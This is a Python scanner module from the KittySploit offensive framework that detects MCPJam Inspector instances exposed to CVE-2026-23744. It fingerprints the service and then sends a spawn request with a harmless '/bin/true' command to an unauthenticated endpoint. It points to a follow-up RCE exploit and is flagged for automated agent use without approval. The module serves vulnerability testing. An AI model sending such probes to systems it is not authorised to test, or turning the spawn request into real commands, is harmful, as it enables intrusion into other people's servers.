#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "MCPJam Inspector CVE-2026-23744 detection",
        "description": (
            "Detects exposed MCPJam Inspector instances and probes unauthenticated "
            "access to /api/mcp/connect (CVE-2026-23744 RCE via serverConfig spawn). "
            "Affected: <= 1.4.2. Fixed in 1.4.3+."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-23744",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-23744",
            "https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6",
            "https://osv.dev/vulnerability/CVE-2026-23744",
        ],
        "modules": [
            "exploits/linux/http/mcpjam_inspector_cve_2026_23744_rce",
        ],
        "tags": [
            "web",
            "scanner",
            "mcpjam",
            "mcp",
            "inspector",
            "rce",
            "cve-2026-23744",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["mcpjam", "mcp"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/api/mcp/connect"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "exploits/linux/http/mcpjam_inspector_cve_2026_23744_rce",
                ],
            },
        },
    }

    _ENDPOINT = "/api/mcp/connect"

    port = OptPort(6274, "MCPJam Inspector port (default 6274)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    active_probe = OptBool(
        True,
        "POST a benign spawn probe to /api/mcp/connect (true/id)",
        required=False,
    )

    def _timeout(self) -> int:
        return max(int(self.timeout or 10), 5)

    def _fingerprint(self) -> bool:
        for path in ("/", "/index.html", "/api/health", "/health"):
            response = self.http_request(
                method="GET",
                path=path,
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response:
                continue
            text = (response.text or "").lower()
            if any(
                marker in text
                for marker in ("mcpjam", "mcp inspector", "@mcpjam", "mcp-jam")
            ):
                return True
        return False

    def _probe_connect(self):
        body = {
            "serverConfig": {
                "command": "/bin/true",
                "args": [],
                "env": {},
            },
            "serverId": "kittysploit-check",
        }
        return self.http_request(
            method="POST",
            path=self._ENDPOINT,
            json=body,
            headers={"Content-Type": "application/json", "Accept": "application/json, */*"},
            timeout=self._timeout(),
            allow_redirects=False,
        )

    @staticmethod
    def _auth_gated(response) -> bool:
        if not response:
            return False
        if response.status_code in (401, 403):
            return True
        text = (response.text or "").lower()
        return any(
            marker in text
            for marker in (
                "unauthorized",
                "forbidden",
                "authentication required",
                "session token",
                "not authenticated",
            )
        )

    def run(self):
        print_status(f"Probing MCPJam Inspector on port {self.port}...")

        fingerprinted = self._fingerprint()
        if fingerprinted:
            print_success("MCPJam UI/API fingerprint matched")
        else:
            print_status("No strong MCPJam fingerprint on common paths")

        if not self.active_probe:
            if fingerprinted:
                self.set_info(
                    severity="high",
                    cve="CVE-2026-23744",
                    reason=(
                        "MCPJam detected; active_probe disabled — verify "
                        "/api/mcp/connect manually (affected <= 1.4.2)"
                    ),
                    confidence="low",
                    endpoint=self._ENDPOINT,
                )
                return True
            print_info("Nothing conclusive without active_probe")
            return False

        response = self._probe_connect()
        if not response:
            if fingerprinted:
                self.set_info(
                    severity="medium",
                    cve="CVE-2026-23744",
                    reason="MCPJam fingerprint present but /api/mcp/connect did not respond",
                    confidence="low",
                    endpoint=self._ENDPOINT,
                )
                return True
            print_info("No response from /api/mcp/connect")
            return False

        if response.status_code == 404:
            print_info("/api/mcp/connect not found")
            return False

        if self._auth_gated(response):
            print_success(
                f"/api/mcp/connect is authentication-gated (HTTP {response.status_code})"
            )
            self.set_info(
                severity="info",
                cve="CVE-2026-23744",
                reason="Connect endpoint requires auth — likely patched (>= 1.4.3)",
                confidence="medium",
                endpoint=self._ENDPOINT,
            )
            return False

        if response.status_code in (200, 201, 202, 400, 500):
            reason = (
                f"Unauthenticated /api/mcp/connect accepted spawn probe "
                f"(HTTP {response.status_code}); likely CVE-2026-23744 (<= 1.4.2)"
            )
            print_warning(reason)
            self.set_info(
                severity="critical",
                cve="CVE-2026-23744",
                reason=reason,
                confidence="high" if fingerprinted else "medium",
                endpoint=self._ENDPOINT,
            )
            return True

        print_info(f"Unexpected HTTP {response.status_code} from connect probe")
        return False
